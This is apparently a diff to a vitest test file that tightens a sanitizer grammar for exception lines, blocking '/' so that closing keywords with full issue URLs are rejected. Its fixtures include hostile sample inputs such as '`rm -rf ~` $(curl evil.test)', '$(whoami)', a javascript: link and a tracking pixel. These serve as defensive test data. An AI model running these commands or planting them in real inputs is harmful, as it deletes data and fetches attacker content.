@@ -27,8 +27,9 @@
  * NOT covered: whether a model renders the reason exactly as the rules say (the
  * closure arm proves the RULES only ever produce admissible lines, not that an
  * orchestrator follows them — code.md's gate is what catches a line that drifted),
- * and GitHub closing keywords written with a full issue URL ("fixes https://…"),
- * which the reason's character set still admits.
+ * and a closing keyword whose target GitHub parses without a `/` or `#` (none is
+ * known: a same-repo `#N`, a cross-repo `owner/repo#N` and a full issue URL each
+ * need one of the two, and both are removed).
  */
 
 import { describe, it, expect } from 'vitest'
@@ -427,7 +428,7 @@ const GRAMMAR_TABLE: ReadonlyArray<{ readonly label: string; readonly value: str
   { label: 'login unavailable', value: line('(login unavailable)', 'no tracker access from CI'), valid: true },
   { label: 'a 39-character login', value: line(`@${'a'.repeat(39)}`, 'ok'), valid: true },
   { label: 'a 200-character reason', value: line('@octocat', 'r'.repeat(200)), valid: true },
-  { label: 'a hyphenated login', value: line('@octo-cat', 'N/A (spike)'), valid: true },
+  { label: 'a hyphenated login', value: line('@octo-cat', 'NA (spike)'), valid: true },
   { label: 'a login with `_`', value: line('@octo_cat', 'x'), valid: false },
   { label: 'a 40-character login', value: line(`@${'a'.repeat(40)}`, 'x'), valid: false },
   { label: 'a login starting with `-`', value: line('@-octo', 'x'), valid: false },
@@ -439,6 +440,7 @@ const GRAMMAR_TABLE: ReadonlyArray<{ readonly label: string; readonly value: str
   { label: 'kind `test-plan`', value: line('@octocat', 'x', 'test-plan'), valid: false },
   { label: 'a mention', value: line('@octocat', 'approved by @lead'), valid: false },
   { label: 'an issue reference', value: line('@octocat', 'fixes #12'), valid: false },
+  { label: 'a closing keyword with a full issue URL', value: line('@octocat', 'fixes https://github.com/o/r/issues/1'), valid: false },
   { label: 'a markdown link', value: line('@octocat', '[click](https://x.test)'), valid: false },
   { label: 'a command substitution', value: line('@octocat', '$(whoami)'), valid: false },
   { label: 'a backtick', value: line('@octocat', 'a `b` c'), valid: false },
@@ -467,7 +469,7 @@ describe('AC-11: the exception grammar — define 2 and code.md\'s gate agree, a
     expect(spec.loginFallback).toBe('(login unavailable)')
     expect(spec.utcFormat).toBe('%Y-%m-%dT%H:%M:%SZ')
     expect(spec.reasonMax).toBe(200)
-    for (const c of ['<', '>', '`', '[', ']', '\\', '#', '@', '&', '$']) expect(spec.removed, `removes ${c}`).toContain(c)
+    for (const c of ['<', '>', '`', '[', ']', '\\', '/', '#', '@', '&', '$']) expect(spec.removed, `removes ${c}`).toContain(c)
   })
 
   it('the template compiled from define 2 decides every table row as the table says', () => {
@@ -490,6 +492,8 @@ describe('AC-11: the exception grammar — define 2 and code.md\'s gate agree, a
     expect(collectGrammarMisses(unanchored).some(m => m.startsWith('trailing text on a second line'))).toBe(true)
     const leaky = compileExceptionTemplate({ ...spec, removed: spec.removed.filter(c => c !== '#') })
     expect(collectGrammarMisses(leaky).some(m => m.startsWith('an issue reference'))).toBe(true)
+    const urlLeaky = compileExceptionTemplate({ ...spec, removed: spec.removed.filter(c => c !== '/') })
+    expect(collectGrammarMisses(urlLeaky).some(m => m.startsWith('a closing keyword with a full issue URL'))).toBe(true)
   })
 })
 
@@ -511,6 +515,7 @@ const RAW_REASONS: readonly string[] = [
   '`rm -rf ~` $(curl evil.test) ${HOME}',
   '![pixel](https://evil.test/p.png) [x](javascript:alert(1)) @everyone @org/team',
   'fixes #12, owner/repo#3, &#35;4',
+  'fixes https://github.com/owner/repo/issues/12 and www.github.com/owner/repo/issues/3',
   'safe‮txt.exe​\ttabbed\r\nwindows',
   `${'long '.repeat(80)}tail`,
   '   \n\t  ',
